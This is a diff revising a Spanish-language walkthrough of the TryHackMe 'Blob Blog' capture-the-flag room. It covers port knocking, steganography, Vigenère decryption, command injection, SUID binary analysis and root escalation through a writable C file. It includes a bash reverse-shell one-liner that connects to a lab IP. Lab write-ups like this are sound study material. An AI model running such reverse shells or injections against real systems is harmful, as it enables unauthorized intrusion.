@@ -1,3 +1,7 @@
+<p align="center">
+  <img src="https://github.com/user-attachments/assets/196b3dcb-ee8a-4fe0-a9d7-fdae456f5b33" alt="Blob Blog" width="627">
+</p>
+
 # Blob Blog — CTF Writeup
 
 > **Platform:** TryHackMe  
@@ -40,43 +44,45 @@ Inicialmente encontré:
 
 ![Nmap results](https://github.com/user-attachments/assets/a7c17223-6c84-45af-afe9-9f50a70323cb)
 
-Por ahora SSH no era especialmente útil porque todavía no tenía credenciales.
+SSH no era especialmente útil todavía porque no tenía credenciales.
 
 ---
 
 ## 🌐 2. Enumeración del puerto 80
 
-La página web inicial no mostraba nada evidente. La revisión del código fuente sí reveló un bloque codificado.
+La página inicial no mostraba nada evidente, así que revisé el código fuente.
 
-![Web source](https://github.com/user-attachments/assets/0abc7270-d117-40a2-865c-ac94f1eee5c6)
+![Código fuente](https://github.com/user-attachments/assets/0abc7270-d117-40a2-865c-ac94f1eee5c6)
 
-Decodificando el contenido apareció un mensaje relacionado con **"knock"** y tres números. Esto apuntaba a un mecanismo de port knocking.
+Encontré un bloque codificado. Después de decodificarlo aparecía una pista relacionada con **"knock"** y tres números.
 
-El concepto era enviar una secuencia concreta de conexiones para abrir puertos que inicialmente no aparecían en el escaneo.
+Esto apuntaba a un mecanismo de **port knocking**.
+
+### Port Knocking
+
+La idea era enviar la secuencia indicada para provocar la apertura de servicios que no aparecían en el primer escaneo.
 
 ```bash
 knock 10.67.183.58 {puertos, separados por espacio}
 ```
 
-Después del knocking volví a enumerar la máquina.
-
 ![Port knocking](https://github.com/user-attachments/assets/407191e1-68b5-4b86-a5dd-176b2ce25bab)
 
-![New ports](https://github.com/user-attachments/assets/c78232f8-7417-40a8-8db3-c50e9d58136f)
+Después del knocking volví a escanear la máquina y aparecieron nuevos servicios.
+
+![Nuevos puertos](https://github.com/user-attachments/assets/c78232f8-7417-40a8-8db3-c50e9d58136f)
 
 ---
 
 ## 📁 3. FTP y búsqueda de credenciales
 
-Uno de los servicios descubiertos posteriormente fue FTP.
+Uno de los nuevos servicios era FTP. El acceso anónimo estaba deshabilitado, así que continué con la enumeración del puerto 80 y de los nuevos servicios.
 
-La conexión anónima estaba deshabilitada, así que continué investigando el servicio web y su código fuente. La enumeración reveló información adicional relacionada con las credenciales.
+La información encontrada permitió identificar al usuario **Bob** y obtener una contraseña codificada que posteriormente pude recuperar.
 
-![FTP / credentials](https://github.com/user-attachments/assets/112be328-6dc9-40a6-89ff-bf414c40a5e9)
+![Credenciales](https://github.com/user-attachments/assets/112be328-6dc9-40a6-89ff-bf414c40a5e9)
 
-La información obtenida permitió identificar al usuario **Bob** y conseguir la contraseña después de decodificarla.
-
-Con las credenciales pude acceder al FTP.
+Con las credenciales obtenidas pude acceder al FTP.
 
 ---
 
@@ -84,9 +90,7 @@ Con las credenciales pude acceder al FTP.
 
 Entre los archivos disponibles encontré una imagen que podía contener información oculta.
 
-Al intentar analizarla con `steghide`, la herramienta solicitó una contraseña. Esto fue otra señal de que todavía faltaba encontrar información durante la enumeración.
-
-La contraseña apareció posteriormente al revisar otro servicio HTTP.
+Al analizarla con `steghide`, la herramienta solicitó una contraseña, por lo que continué enumerando los servicios para encontrarla.
 
 ```bash
 steghide extract -sf cool.jpeg
@@ -94,31 +98,33 @@ steghide extract -sf cool.jpeg
 
 ![Steghide](https://github.com/user-attachments/assets/5afb99b4-0d9c-41a5-bf23-135e1ae22f69)
 
-El contenido extraído parecía ser un texto cifrado y también daba una pista relacionada con un directorio.
+La información extraída tenía apariencia de texto cifrado y también incluía una pista relacionada con un directorio.
 
 ---
 
-## 🔐 5. Vigenère y credenciales de Bob
+## 🔐 5. Vigenère y Bob's Drawer
 
-Uno de los servicios descubiertos utilizaba el puerto **445**, pero en esta máquina no correspondía a SMB sino a HTTP.
+El puerto **445** también requería atención: en esta máquina no correspondía a SMB, sino a HTTP.
 
-Con `dirsearch` encontré una ruta interesante:
+Utilicé `dirsearch` para continuar la enumeración:
 
 ```bash
 dirsearch -u 10.67.183.58:445 -e * -r
 ```
 
-La revisión del código fuente de esa ruta proporcionó otra contraseña que podía utilizarse con la imagen.
+La enumeración reveló una ruta interesante y, revisando su contenido, encontré otra contraseña.
 
-![Enumeration](https://github.com/user-attachments/assets/ba6fe7d7-7a35-4bb7-91ef-5a387fa7dcf3)
+![Enumeración](https://github.com/user-attachments/assets/ba6fe7d7-7a35-4bb7-91ef-5a387fa7dcf3)
 
-El resultado extraído tenía apariencia de texto cifrado con **Vigenère**. También había una referencia a un directorio.
+Con la información obtenida pude continuar con la imagen y llegar a **Bob's drawer**.
 
-Al probar la información obtenida contra los servicios HTTP apareció **Bob's drawer**, que proporcionó el dato necesario para utilizarlo como clave Vigenère.
+![Bob's drawer](https://github.com/user-attachments/assets/b2e1fa02-3ee8-4173-acb9-2f8dc57ab169)
 
-Después de descifrarlo obtuve las credenciales de Bob.
+El resultado tenía apariencia de un texto cifrado con **Vigenère**. Utilicé el dato obtenido como clave para descifrarlo.
 
-![Vigenère result](https://github.com/user-attachments/assets/4a57c94c-5e8e-4bcf-b923-ef5c6c3080a4)
+![Vigenère](https://github.com/user-attachments/assets/4a57c94c-5e8e-4bcf-b923-ef5c6c3080a4)
+
+El resultado fueron las credenciales de Bob.
 
 ---
 
@@ -134,33 +140,37 @@ python3 /opt/dirsearch/dirsearch.py -u 10.67.183.58:8080 -e * -r
 
 Las rutas encontradas redirigían a un login. Las credenciales de Bob funcionaron.
 
-![Port 8080](https://github.com/user-attachments/assets/98263c4d-4efe-44a6-bd88-9eec2c631b46)
+![Puerto 8080](https://github.com/user-attachments/assets/98263c4d-4efe-44a6-bd88-9eec2c631b46)
 
-Después de iniciar sesión encontré una página de review con un campo de entrada. Al probar comandos básicos, observé que la salida aparecía reflejada en la página.
+Después de iniciar sesión encontré una página de review con un campo de entrada.
 
-Por ejemplo, una prueba con:
+---
+
+## 💉 7. Command Injection
+
+Probé comandos básicos en el campo de entrada. Por ejemplo:
 
 ```bash
 ls
 ```
 
-confirmó que la aplicación estaba ejecutando comandos.
+La salida del comando aparecía reflejada en la página, confirmando que la aplicación estaba ejecutando comandos.
 
 ![Command execution](https://github.com/user-attachments/assets/e24765f6-75d5-4e02-9c4a-4a2aea77a0ad)
 
 ---
 
-## 🐚 7. Acceso inicial — Reverse Shell
+## 🐚 8. Acceso inicial — Reverse Shell
 
-Con la ejecución de comandos confirmada, utilicé una reverse shell en el laboratorio:
+Con la ejecución de comandos confirmada, utilicé una reverse shell dentro del laboratorio:
 
 ```bash
 bash -i >& /dev/tcp/10.9.1.161/4444 0>&1
 ```
 
-Esto permitió obtener una shell en la máquina como **www-data**.
+Esto permitió obtener una shell como **www-data**.
 
-![Initial shell](https://github.com/user-attachments/assets/c70a6a83-25db-435d-b99b-655d17c90eab)
+![Reverse shell](https://github.com/user-attachments/assets/c70a6a83-25db-435d-b99b-655d17c90eab)
 
 Después mejoré la terminal:
 
@@ -182,11 +192,15 @@ export TERM=xterm-256color
 
 ---
 
-## ⬆️ 8. Escalada a usuario
+## ⬆️ 9. Escalada a usuario
 
-Como `www-data`, `sudo -l` no mostró privilegios útiles.
+Como `www-data`, comprobé primero los privilegios mediante:
 
-Continué con una búsqueda de binarios SUID:
+```bash
+sudo -l
+```
+
+No encontré privilegios útiles, así que continué con una enumeración de binarios SUID:
 
 ```bash
 find / -perm -4000 2>/dev/null
@@ -200,34 +214,38 @@ blogFeeback
 
 ![SUID enumeration](https://github.com/user-attachments/assets/a9cd5c6a-abc7-4c8d-80db-c56e13a94eab)
 
-Para entender su comportamiento transferí el binario a mi máquina y lo analicé con **Ghidra**.
+### Análisis con Ghidra
+
+Para entender el comportamiento del binario lo transferí a mi máquina y lo analicé con **Ghidra**.
 
 El análisis mostró un bucle de 1 a 7 que comparaba `7 - iteration` con los argumentos recibidos. Además, `iVar1` avanzaba sobre los argumentos, indicando que el programa esperaba varios parámetros en un orden concreto.
 
-La secuencia correcta permitió obtener acceso como el usuario de la máquina.
+![Ghidra](https://github.com/user-attachments/assets/196b3dcb-ee8a-4fe0-a9d7-fdae456f5b33)
 
-![Ghidra analysis](https://github.com/user-attachments/assets/196b3dcb-ee8a-4fe0-a9d7-fdae456f5b33)
+La secuencia correcta permitió obtener acceso como el usuario de la máquina.
 
 ---
 
-## 👑 9. Escalada a root
+## 👑 10. Escalada a root
 
-Después de obtener el acceso como usuario, empecé a investigar un comportamiento extraño: aparecía periódicamente un mensaje en la terminal.
+Después de obtener acceso como usuario observé un comportamiento extraño: aparecía periódicamente un mensaje en la terminal.
 
-La crontab normal no explicaba ese comportamiento, así que utilicé **pspy64** para observar procesos ejecutados en segundo plano.
+La crontab normal no explicaba este comportamiento, así que utilicé **pspy64** para observar procesos ejecutados en segundo plano.
 
 ```bash
 chmod +x pspy64
 ./pspy64
 ```
 
-![pspy](https://github.com/user-attachments/assets/ac98c82c-ac8f-418c-af62-79e814e31e40)
+![pspy64](https://github.com/user-attachments/assets/ac98c82c-ac8f-418c-af62-79e814e31e40)
 
 pspy reveló un proceso muy interesante:
 
 ```text
 /bin/sh -c gcc /home/bobloblaw/Documents/.boring_file.c -o /home/bobloblaw/Documents/.also_boring/.still_boring && chmod +x /home/bobloblaw/Documents/.also_boring/.still_boring && /home/bobloblaw/Documents/.also_boring/.still_boring | tee /dev/pts/0 /dev/pts/1 /dev/pts/2 && rm /home/bobloblaw/.also_boring/.still_boring
 ```
+
+![Proceso programado](https://github.com/user-attachments/assets/170155?dummy=1)
 
 La cadena hacía varias cosas:
 
@@ -237,29 +255,23 @@ La cadena hacía varias cosas:
 4. Ejecutaba el binario.
 5. Eliminaba el archivo generado.
 
-Lo más importante era que el proceso se ejecutaba con privilegios de **root** y el archivo C podía ser modificado por el usuario.
+Lo importante era que el proceso se ejecutaba con privilegios de **root** y el archivo C podía ser modificado por el usuario.
 
-![Cron process](https://github.com/user-attachments/assets/770c?dummy=1)
-
-Por tanto, la superficie de escalada estaba en el archivo:
+El archivo vulnerable era:
 
 ```text
 /home/bobloblaw/Documents/.boring_file.c
 ```
 
-Al reemplazar su contenido por código que permitiera obtener una shell con los privilegios del proceso y esperar a la siguiente ejecución programada, fue posible conseguir acceso como **root**.
-
-![Root](https://github.com/user-attachments/assets/196b3dcb-ee8a-4fe0-a9d7-fdae456f5b33)
+Al modificar ese archivo y esperar a su siguiente ejecución programada, conseguí ejecutar código dentro del contexto privilegiado del proceso y obtener acceso como **root**.
 
 ---
 
-## 🏁 10. Flags
+## 🏁 11. Flags
 
 ### User Flag
 
-El acceso al usuario se consiguió después de analizar el binario SUID `blogFeeback` y proporcionar los argumentos esperados por el programa.
-
-![User flag](https://github.com/user-attachments/assets/160337?dummy=1)
+El acceso al usuario se consiguió después de analizar el binario SUID `blogFeeback` y determinar los argumentos que esperaba.
 
 ### Root Flag
 
@@ -269,15 +281,15 @@ La escalada final se consiguió aprovechando el archivo C escribible que era com
 
 ## 🧠 What I Learned
 
-- No asumir que un puerto concreto necesariamente ejecuta el servicio esperado; hay que enumerarlo.
+- No asumir que un puerto concreto necesariamente ejecuta el servicio esperado.
 - Revisar siempre el código fuente de las aplicaciones web.
-- La información codificada puede contener pistas para continuar la enumeración.
+- La información codificada puede contener pistas importantes.
 - El **port knocking** puede ocultar servicios que no aparecen en el primer escaneo.
 - Las imágenes pueden contener información mediante esteganografía.
-- Vigenère puede aparecer como una segunda capa después de extraer información de un archivo.
-- Un binario SUID desconocido merece investigación, no solo una lista de permisos.
-- Ghidra ayuda a entender la lógica de binarios cuando no tenemos el código fuente.
-- `pspy` es útil para descubrir procesos programados que no aparecen claramente en la crontab.
+- Un texto extraído puede necesitar una segunda etapa de descifrado, como Vigenère.
+- Un binario SUID desconocido merece ser investigado.
+- Ghidra permite entender la lógica de un binario cuando no tenemos su código fuente.
+- `pspy` ayuda a descubrir procesos programados que no aparecen claramente en la crontab.
 - Un archivo modificable que posteriormente es compilado y ejecutado por root puede convertirse en una vía de escalada.
 
 ## 🛠️ Tools Used
@@ -293,9 +305,3 @@ La escalada final se consiguió aprovechando el archivo C escribible que era com
 - pspy64
 - Python
 - Bash
-
----
-
-## 📌 Evidencias
-
-Las capturas utilizadas en esta documentación corresponden al proceso de resolución de Blob Blog y están colocadas junto a las etapas donde aportan contexto visual.
